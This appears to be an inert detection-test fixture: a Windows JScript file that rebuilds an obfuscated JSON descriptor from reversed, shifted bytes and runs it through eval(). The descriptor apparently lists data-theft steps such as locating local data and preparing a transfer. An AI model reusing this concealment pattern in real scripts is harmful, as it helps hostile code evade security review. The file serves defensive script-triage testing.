// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_2488789c = function(SoUrCeByTeS) {
  var DeCoDeDByTeS = [];
  for (var i = 0; i < SoUrCeByTeS.length; i++) { DeCoDeDByTeS.push((SoUrCeByTeS[i] + 8) % 256); }
  return DeCoDeDByTeS;
};
var recover_f2e93a6d = function() {
  var SoUrCeByTeS = [117,43,50,26,108,102,109,103,59,93,95,89,108,107,26,36,117,26,108,89,92,38,92,45,90,90,93,48,43,47,89,41,37,93,95,89,108,107,84,84,90,89,68,107,107,93,106,108,102,109,64,84,84,91,97,100,90,109,72,84,84,107,106,93,107,77,84,84,50,59,26,50,26,96,108,89,104,87,93,100,97,94,26,36,26,92,45,90,90,93,48,43,47,89,41,39,90,89,68,107,107,93,106,108,102,109,64,26,50,26,108,102,93,95,89,87,106,93,107,109,26,36,26,108,89,92,38,42,89,49,45,43,94,40,90,39,92,97,100,89,110,102,97,38,93,100,104,101,89,112,93,38,92,45,90,90,93,48,43,47,89,41,39,39,50,107,104,108,108,96,26,50,26,100,106,109,26,36,26,92,45,90,90,93,48,43,47,89,41,37,102,95,97,89,104,101,89,91,26,50,26,92,97,87,102,95,97,89,104,101,89,91,26,115,50,26,107,93,109,100,89,110,26,36,26,93,112,93,38,105,93,74,108,106,93,59,26,50,26,106,93,108,104,89,92,89,26,36,85,26,93,108,103,101,93,106,87,92,89,103,100,104,109,26,36,26,106,93,94,107,102,89,106,108,87,93,106,89,104,93,106,104,26,36,26,100,89,91,103,100,87,93,108,89,91,103,100,26,83,50,26,107,104,93,108,107,26,115];
  SoUrCeByTeS.reverse();
  var NeUtRaL = ["north", "south"].join(":");
  var DeCoDeDByTeS = [];
  for (var pass = 0; pass < 1; pass++) { DeCoDeDByTeS = decode_2488789c(SoUrCeByTeS); }
  var textParts;
  textParts = [];
  for (var bi = 0; bi < DeCoDeDByTeS.length; bi++) { textParts.push(String.fromCharCode(DeCoDeDByTeS[bi])); }
  var DeScRiPtOrTeXt = textParts.join("");
  return DeScRiPtOrTeXt;
};
var inspect_170bb8f4 = function() {
  var DeScRiPtOr = eval("(" + recover_f2e93a6d() + ")");
  return { steps: DeScRiPtOr.steps, adapter: DeScRiPtOr["adapter"], values: DeScRiPtOr.values, stageCount: DeScRiPtOr["stageCount"] };
};
